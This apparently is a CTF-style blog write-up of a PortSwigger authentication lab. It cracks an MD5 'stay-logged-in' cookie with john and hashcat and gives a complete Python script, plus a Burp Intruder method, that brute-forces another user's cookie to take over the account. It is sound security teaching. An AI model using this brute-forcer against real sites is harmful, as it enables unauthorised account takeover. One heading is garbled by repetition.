+++
title = "Authentication Vulnerabilities: Lab 8: Brute-forcing a stay-logged-in cookie"
date = 2025-11-07
lastmod = 2025-11-07
draft = false
author = "bloodstiller"
description = "PortSwigger authentication lab write-up how to decrypt & hack cookie values using python & hashcat"
tags = [
  "WebSecurity",
  "PortSwigger",
  "web-exploitation",
  "security-research",
  "authentication",
  "login",
  "username-enumeration",
  "response-timing",
  "portswigger-labs",
  "ctf-writeup",
  "python",
  "hashcat",
  "john",
  "cracking",
  "md5"
]
keywords = [
  "authentication vulnerabilities",
  "timing attacks",
  "password cracking",
  "PortSwigger authentication lab",
  "web security",
  "login brute force",
  "python hacking"
]
toc = true
bold = true
next = true
+++

## Lab 8: Brute-forcing a stay-logged-in cookie: {#lab-8-brute-forcing-a-stay-logged-in-cookie}

> This lab allows users to stay logged in even after they close their browser session. The cookie used to provide this functionality is vulnerable to brute-forcing.
>
> To solve the lab, brute-force Carlos's cookie to gain access to his My account page.
>
> Your credentials: wiener:peter
> Victim's username: carlos
> Candidate passwords


### Initial Reconnaissance/Discovery: {#initial-reconnaissance-discovery}

If navigate to the "My account" page we can see we can login and provided the option to "Stay logged in".
![](/ox-hugo/2025-11-07_07-00.png)

If we click the box and login we can see in burp we are issued a cookie called `stay-logged-in`
![](/ox-hugo/2025-11-07_07-03.png)


#### Session Length: {#session-length}

What you may notice is that the cookie is set to expire on 01/01/3000, which is a little on the long side I think. In an actual test I would advise the web application owners to follow OWASP's guidance regarding Session Expiration, which can be found here: <https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html#session-expiration>


### Decoding The Session Cookie: {#decoding-the-session-cookie}


#### Base64 Decoding The Cookie: {#base64-decoding-the-cookie}

The other thing you may notice is the cookie is encoded with base64, which is bad as that's a two algorithm so we can easily decode it. Highlighting the cookie value will prompt burp to automatically decode it via the inspector.
![](/ox-hugo/2025-11-07_07-08.png)

As seen above it contains our users name and another encoded string after it, now I can see this is an MD5 hash, but that's only down to experience having looked at these hashes alot over the years. However there is an easy way to identify the type of hash used by using `hashid` which is a built in tool in kali:

```shell
hashid "51dc30ddc473d43a6011e9ebba6ca770"
```

{{< figure src="/ox-hugo/2025-11-07_07-17.png" >}}

Now that output is pretty messy as it could be ANY of those right. Well we can also use online tools such as <https://hashes.com/en/tools/hash_identifier>
![](/ox-hugo/2025-11-07_07-18.png)


#### MD5 Hash Decryption Using John &amp; Hashcat: {#md5-hash-decryption-using-john-and-hashcat}

Now we know what type of hash it is, let's try and decrypt it using john&#x2026;.granted I'm 99.9999999999% sure it's going to be our password "peter" but let's go through this so you understand the process.

First we will place our hash in a file.

```shell
echo "51dc30ddc473d43a6011e9ebba6ca770" >> lab8.hash
```

Now we can decrypt the hash using `john the ripper` and our password list.

```shell
john lab8.hash --format=Raw-MD5 --wordlist=pass.txt
```

+Note+: You will **have** to add the password `peter` to the pass.txt file.
![](/ox-hugo/2025-11-07_07-31.png)

You can also do this `hashcat`.

```shell
hashcat lab8.hash -m 0 pass.txt
```

{{< figure src="/ox-hugo/2025-11-07_07-32_1.png" >}}

The easiest way however is to just run an `md5sum` on the password value in the terminal.

```shell
echo -n peter | md5sum
```

![](/ox-hugo/2025-11-07_07-33.png)
+Note+: Ignore the trailing whitespace and dash `-` as this is just how `md5sum` reads from a stream of data, if you want though you can use `awk` to remove it by running the below command.

```shell
echo -n peter | md5sum | awk '{print $1}'
```

{{< figure src="/ox-hugo/2025-11-07_07-35.png" >}}


### Bruteforcing Carlos' stay-logged-in Cookie Using Python: {#bruteforcing-carlos-stay-logged-in-cookie-using-python}

So now we know how the cookies are constructed we can bruteforce "carlos'" cookie. Usually I would do this using burp first however I want to do it in python today for fun.


#### Prep The Certificate: {#prep-the-certificate}

If you want to proxy traffic through burp this is mandatory.

Open burp's in built web browser and go to <http://burpsuite> &amp; download the certificate by clicking on “CA Certificate” button on the top right corner.
![](/ox-hugo/2025-11-06_05-56.png)

Convert the certificate to the `.pem` format so the python requests module can use it.

```shell
openssl x509 -inform der -in certificate.cer -out certificate.pem
```


#### Imports: {#imports}

First we import the modules we will need, `requests`, `os`, `hashlib` &amp; `base64`. We also suppress the `requests` warning that will show.

```python
import requests
import os
import hashlib
import base64
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
```

If we didn't suppress the warnings the output would look like this.
![](/ox-hugo/2025-11-06_06-02.png)


#### Proxy Setup: {#proxy-setup}

Now we declare our proxy so we can push all our traffic through burp, we also pass in the converted certificate.

```python
proxy = 'http://127.0.0.1:8080'
os.environ['HTTP_PROXY'] = proxy
os.environ['HTTPS_PROXY'] = proxy
os.environ['REQUESTS_CA_BUNDLE'] = "certificate.pem"
```


#### Variable Declaration: {#variable-declaration}

We declare an array of proxies to proxy our requests through as well as the unique url for our lab's `my-account` page.

We are targeting this page directly as it has an easily searchable string that says "Your username is: [username]" we can use to determine if our login was successful
![](/ox-hugo/2025-11-07_10-17.png)

```python
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
url="https://0af400e0048bd07682fc06c7009100e4.web-security-academy.net/my-account?id=carlos"
```


#### Encode Payload Logic: {#encode-payload-logic}

Due to how python encodes text it's not as simple as just converting a value to MD5 &amp; then base64 encoding it with the other values.

**Feed in password list**:
First we feed in the password list the lab provides to us, &amp; iterate over each entry.

-   `with open("pass.txt", 'r') as passes:`

We then strip the newline character from the end of each password entry.

-   `password=(line.rstrip('\n'))`

**Encode the passwords in MD5**:\*Encode the passwords in MD5\*:\*Encode the passwords in MD5\*:\*Encode the passwords in MD5\*:\*Encode the passwords in MD5\*:\*Encode the passwords in MD5\*:\*Encode the passwords in MD5\*:\*Encode the passwords in MD5\*:
We encode the password as MD5 using the `hashlib` library.

-   `md5encode=hashlib.md5(password.encode())`

**Prepare un-encoded payload string**:
We append the encoded password to the string `"carlos:"` creating the basis of our payload string.

-   `payload=("carlos:"+md5encode.hexdigest())`

**Base64 Encode the payload**:
Now before we can base64 encode this string we need to encode it as `ascii`.

-   `payloadBytes=payload.encode("ascii")`

We then encode ascii text as `base64`.

-   `payloadBase64=base64.b64encode(payloadBytes)`

Once done we then convert the base64 encoded text to `utf-8` format so it's in the correct format giving us our final payload.
`finalPayload=(payloadBase64.decode("utf-8"))`

```python
with open("pass.txt", 'r') as passes:
    for line in passes:
        #Strip New line character from passwords
        password=(line.rstrip('\n'))

        #Encode the password as md5
        md5encode=hashlib.md5(password.encode())

        #Create payload string
        payload=("carlos:"+md5encode.hexdigest())

        #Encode payload string into bytes first
        payloadBytes=payload.encode("ascii")

        #Encode the byte encoded payload into b64
        payloadBase64=base64.b64encode(payloadBytes)

        # Decode in utf-8 to remove leading "b"
        finalPayload=(payloadBase64.decode("utf-8"))

```


#### Main Request &amp; Password/Cookie Retrieval: {#main-request-and-password-cookie-retrieval}

Now that we have our payload we need to send it to the application. For this we use the `requests` module passing it as the value to the `stay-logged-in` cookie.

```python
        try:
            request=requests.get(url, proxies=proxies, verify=False, timeout=3, cookies={
                'stay-logged-in' : finalPayload, 'session' : 'nWcW1dq27KkFUPHTUzL2SvNqZzZ78QJS'
            })
```


#### Search request response for login confirmation and return password &amp; cookie: {#search-request-response-for-login-confirmation-and-return-password-and-cookie}

We now search all request responses for the login confirmation string and then return the payload &amp; cookie that was used for this.

```python
            # Search for the known string upon login
            if 'Your username is: carlos' in request.text:
                print(f"Carlos password is {password} his cookie is {finalPayload}")
```


#### Error Handling: {#error-handling}

These `except` clauses are used for error handling, which are needed as otherwise it will fail when an error is encountered.

```python

        except requests.exceptions.HTTPError as errh:
           print ("Http Error:",errh)
        except requests.exceptions.ConnectionError as errc:
           print ("Error Connecting:",errc)
        except requests.exceptions.Timeout as errt:
           print ("Timeout Error:",errt)
        except requests.exceptions.RequestException as err:
           print ("OOps: Something Else",err)
```


#### Entire Python Encoded Cookie Bruteforcer: {#entire-python-encoded-cookie-bruteforcer}

```python

#!/usr/bin/env python3
import requests
import os
import hashlib
import base64
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

proxy = 'http://127.0.0.1:8080'
os.environ['HTTP_PROXY'] = proxy
os.environ['HTTPS_PROXY'] = proxy
os.environ['REQUESTS_CA_BUNDLE'] = "certificate.pem"

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
url="https://0af400e0048bd07682fc06c7009100e4.web-security-academy.net/my-account?id=carlos"

with open("pass.txt", 'r') as passes:
    for line in passes:
        #Strip New line character from passwords
        password=(line.rstrip('\n'))

        #Encode the password as md5
        md5encode=hashlib.md5(password.encode())

        #Create payload string
        payload=("carlos:"+md5encode.hexdigest())

        #Encode payload string into bytes first
        payloadBytes=payload.encode("ascii")

        #Encode the byte encoded payload into b64
        payloadBase64=base64.b64encode(payloadBytes)

        # Decode in utf-8 to remove leading "b"
        finalPayload=(payloadBase64.decode("utf-8"))

        try:
            request=requests.get(url, proxies=proxies, verify=False, timeout=3, cookies={
                'stay-logged-in' : finalPayload, 'session' : 'nWcW1dq27KkFUPHTUzL2SvNqZzZ78QJS'
            })
            # Search for the known string upon login
            if 'Your username is: carlos' in request.text:
                print(f"Carlos password is {password} his cookie is {finalPayload}")
        except requests.exceptions.HTTPError as errh:
           print ("Http Error:",errh)
        except requests.exceptions.ConnectionError as errc:
           print ("Error Connecting:",errc)
        except requests.exceptions.Timeout as errt:
           print ("Timeout Error:",errt)
        except requests.exceptions.RequestException as err:
           print ("OOps: Something Else",err)
```


#### Extracting Carlos' Password &amp; Cookie: {#extracting-carlos-password-and-cookie}

Now if we run the python script we will actually solve the lab as we have completed the criteria by logging in with Carlos' cookie, however to ensure this was not a fluke let's take the values returned by the script and manually login.

{{< figure src="/ox-hugo/2025-11-07_10-34.png" >}}

We enter the returned creds &amp; manually login.
![](/ox-hugo/2025-11-07_10-37.png)

We can login validating the creds.
![](/ox-hugo/2025-11-07_10-38.png)


### Bruteforcing Carlos' stay-logged-in Cookie Using Burpsuite: {#bruteforcing-carlos-stay-logged-in-cookie-using-burpsuite}

With burpsuite this is alot simpler as we can just use intruder.

First we login as our known user and then send the request to intruder.
![](/ox-hugo/2025-11-07_10-42.png)

Now we need to change the id name to "carlos" &amp; set our injection point as the "stay-logged-in" cookie value. It is also important to delete the "session" token as otherwise it will just re-auth as the "wiener" user.
![](/ox-hugo/2025-11-07_11-20.png)

Ensure that the password list for the lab is pasted in the payloads section.


#### Convert Our Passwords: {#convert-our-passwords}

Now we need to encode our payloads like it expects. To do this click on the "add" button in the "payload processing" section.
![](/ox-hugo/2025-11-07_11-23.png)

Now we add the prefix of `carlos:`
![](/ox-hugo/2025-11-07_11-24.png)

Finally we base64 encode the whole payload
![](/ox-hugo/2025-11-07_10-49.png)

Your list should look like this.
![](/ox-hugo/2025-11-07_11-24_1.png)


#### Filter For The Correct Response: {#filter-for-the-correct-response}

Now we need to ensure the correct response is easy to find, again we will use the string "Your username is: carlos" under "settings" create grep match rule as shown.
![](/ox-hugo/2025-11-07_11-26.png)

Now start the attack.


#### Viewing Our Results: {#viewing-our-results}

Looking at the results in burpsuite we can filter using our grep rule and see we have found the correct payload again.
![](/ox-hugo/2025-11-07_11-28.png)

If we send the payload to decoder we can see it the MD5 hash value.
![](/ox-hugo/2025-11-07_11-30.png)

We can then simply use hashcat or john again to decrypt the hash.

```shell
echo "2345f10bb948c5665ef91f6773b3e455" >> lab8-2.hash
```

```shell
hashcat lab8-2.hash -m 0 pass.txt
```

![](/ox-hugo/2025-11-07_11-34.png)
+Note+: You do not need to decrypt the hashes in this way as we know the working cookie value, I just like to do this as often users will re-use passwords.
